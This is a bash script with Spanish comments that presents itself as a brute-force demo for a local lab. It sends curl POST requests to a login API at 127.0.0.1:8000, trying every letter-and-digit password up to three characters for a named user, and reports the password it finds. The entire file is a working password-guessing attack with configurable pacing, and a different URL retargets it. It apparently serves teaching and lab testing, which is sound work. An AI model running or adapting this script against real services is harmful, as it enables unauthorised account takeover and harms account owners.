#!/usr/bin/env bash
#
# brute.sh — demo controlada de fuerza bruta (usar SOLO en laboratorio local)
# Uso: ./brute.sh <usuario>
#
# Configuración (edítala si quieres)
API="http://127.0.0.1:8000/login"

# Character set (letters + digits)
CHARS=(a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9)

MAXLEN=3          # longitud máxima a probar (1..MAXLEN)
DELAY=0           # segundos entre intentos (0 para no esperar)
PAUSE_EVERY=400   # cada N intentos hace una pausa corta (evitar saturar)
PAUSE_TIME=0.15   # segundos a pausar cuando PAUSE_EVERY se cumple

CURL_TIMEOUT=6    # tiempo máximo de espera para cada curl (segundos)

# ---------------------- manejo de argumentos ----------------------
if [[ $# -lt 1 ]]; then
  echo "Uso: $0 <usuario>"
  echo "Ej: $0 admin"
  exit 1
fi

USER="$1"

# ---------------------- variables de control ----------------------
attempts=0
start=$(date +%s)

# cuando el usuario presione Ctrl+C, mostrar resumen y salir
trap 'echo -e "\n\nInterrupción detectada. Intentos totales: '"$attempts"'"; exit 2' INT

# función que intenta una contraseña
attempt() {
  local pwd="$1"
  attempts=$((attempts+1))

  # construir payload JSON
  payload='{"username":"'"$USER"'","password":"'"$pwd"'"}'

  # enviar POST con curl (quiet, pero guardamos la respuesta)
  resp=$(curl -s -X POST "$API" \
    -H "Content-Type: application/json" \
    --max-time "$CURL_TIMEOUT" \
    --data "$payload")

  # imprimir resumen por intento
  printf "[%d] '%s' -> %s\n" "$attempts" "$pwd" "$resp"

  # detectar éxito por texto (ajusta si tu API responde distinto)
  if [[ "$resp" == *"login successful"* || "$resp" == *'"ok":true'* ]]; then
    end=$(date +%s)
    elapsed=$((end-start))
    echo -e "\n✅ ENCONTRADA: usuario='$USER' contraseña='$pwd'"
    echo "Intentos: $attempts  |  Tiempo: ${elapsed}s"
    exit 0
  fi

  # pausa opcional entre intentos
  if (( $(echo "$DELAY > 0" | bc -l) )); then
    sleep "$DELAY"
  fi

  # pausa periódica para no saturar
  if (( PAUSE_EVERY > 0 && attempts % PAUSE_EVERY == 0 )); then
    sleep "$PAUSE_TIME"
  fi
}

# ---------------------- inicio ----------------------
echo "[*] Brute-force en '$USER' | chars=${CHARS[*]} | maxlen=$MAXLEN"
echo "API: $API"
echo "Comenzando prueba (Ctrl+C para cancelar)..."
echo "-------------------------------------------------"

# len = 1
for c1 in "${CHARS[@]}"; do
  attempt "$c1"
done

# len = 2
if (( MAXLEN >= 2 )); then
  for c1 in "${CHARS[@]}"; do
    for c2 in "${CHARS[@]}"; do
      attempt "$c1$c2"
    done
  done
fi

# len = 3
if (( MAXLEN >= 3 )); then
  for c1 in "${CHARS[@]}"; do
    for c2 in "${CHARS[@]}"; do
      for c3 in "${CHARS[@]}"; do
        attempt "$c1$c2$c3"
      done
    done
  done
fi

# len = 4 (opcional)
# if (( MAXLEN >= 4 )); then
#   for c1 in "${CHARS[@]}"; do
#     for c2 in "${CHARS[@]}"; do
#       for c3 in "${CHARS[@]}"; do
#         for c4 in "${CHARS[@]}"; do
#           attempt "$c1$c2$c3$c4"
#         done
#       done
#     done
#   done
# fi

end=$(date +%s)
elapsed=$((end-start))
echo -e "\n❌ NO encontrada (hasta longitud $MAXLEN)."
echo "Intentos: $attempts  |  Tiempo: ${elapsed}s"
exit 1


